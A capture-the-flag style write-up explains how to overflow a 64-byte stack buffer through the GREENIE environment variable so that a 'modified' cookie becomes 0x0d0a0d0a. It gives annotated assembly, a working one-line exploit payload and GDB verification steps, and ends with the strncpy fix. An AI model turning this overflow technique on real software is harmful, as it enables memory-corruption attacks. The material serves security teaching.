# ex02 — Environment Variable Stack Overflow

## Goal

Set the `GREENIE` environment variable to overflow a buffer and set a `modified` cookie to `0x0d0a0d0a`:

```
you have correctly modified the variable
```

## Concept

This challenge introduces **environment variables** as the attack vector. The program:

1. Reads the `GREENIE` environment variable using `getenv()`.
2. Copies its value into a 64-byte stack buffer using `strcpy()`.
3. Checks if a cookie variable has been overwritten to a specific value.

### Why environment variables matter

Environment variables are inherited by child processes and can be set before program execution. They are a common attack vector because:
- They can contain arbitrary data
- They are passed to the program without any length restrictions
- Many programs use them unsafely (e.g., `PATH`, `LD_PRELOAD`, custom variables)

## Memory Layout

```
Higher addresses
┌─────────────────────────────┐
│  modified (4 bytes)         │  [esp+0x58]  ← target: must be 0x0d0a0d0a
├─────────────────────────────┤
│  env_value (4 bytes)        │  [esp+0x5c]  ← pointer to getenv("GREENIE")
├─────────────────────────────┤
│  ... (padding)              │
├─────────────────────────────┤
│  buffer (64 bytes)          │  [esp+0x18]  ← strcpy writes here
├─────────────────────────────┤
│  ...                        │
Lower addresses
```

## Relevant Assembly (`main`)

```asm
0804849d <main>:
    mov    DWORD PTR [esp], 0x80485e0   ; arg1 = "GREENIE"
    call   getenv                        ; eax = getenv("GREENIE")
    mov    DWORD PTR [esp+0x5c], eax    ; store pointer to env value

    mov    DWORD PTR [esp+0x58], 0x0    ; modified = 0

    mov    eax, DWORD PTR [esp+0x5c]    ; eax = env value pointer
    mov    DWORD PTR [esp+0x4], eax     ; arg2 = env value

    lea    eax, [esp+0x18]              ; eax = &buffer[0]
    mov    DWORD PTR [esp], eax         ; arg1 = buffer
    call   strcpy                       ; strcpy(buffer, env_value) — NO BOUNDS CHECK

    mov    eax, DWORD PTR [esp+0x58]    ; eax = modified
    cmp    eax, 0x0d0a0d0a              ; compare with expected value
    jne    ...                          ; if not equal, fail
```

### Step-by-step analysis

| Instruction | What it does |
|---|---|
| `call getenv` | Gets pointer to `GREENIE` environment variable value |
| `mov [esp+0x5c], eax` | Stores the pointer |
| `mov [esp+0x58], 0x0` | Initializes `modified = 0` |
| `call strcpy` | Copies env value into the 64-byte buffer |
| `cmp eax, 0x0d0a0d0a` | Checks if modified equals `0x0d0a0d0a` |

## Exploit

The target value `0x0d0a0d0a` in little-endian is the byte sequence `\x0a\x0d\x0a\x0d`:

```bash
GREENIE="$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x0a\x0d\x0a\x0d")')" ./bin
```

### Why it works

- `getenv("GREENIE")` returns a pointer to the environment variable's value string
- `strcpy()` copies this value into the 64-byte buffer with no bounds checking
- 64 bytes of `"A"` fill the buffer
- The next 4 bytes (`\x0a\x0d\x0a\x0d`) overwrite `modified`
- In little-endian, `0x0d0a0d0a` is the expected value

### Little-endian explanation

```
Memory address:  [esp+0x58]  [esp+0x59]  [esp+0x5a]  [esp+0x5b]
Byte value:       0x0a        0x0d        0x0a        0x0d

As a 32-bit integer (little-endian): 0x0d0a0d0a
```

## GDB Verification

```bash
gdb -q ./bin
```

```gdb
# Break after strcpy returns
break *0x080484e4
run < /dev/null
# (with GREENIE set in environment)

# Check the modified variable
x/wx $esp+0x58
# Output: 0x0d0a0d0a

# Check the bytes
x/4xb $esp+0x58
# Output: 0x0a  0x0d  0x0a  0x0d

# Check the buffer
x/16xb $esp+0x18
# Output: 0x41  0x41  0x41  0x41 ...

# Continue to see success
continue
```

## Key Takeaway

Environment variables are an often-overlooked attack surface. Any program that reads environment variables and processes them without bounds checking is vulnerable. The fix is to use `strncpy()` or check the length before copying.
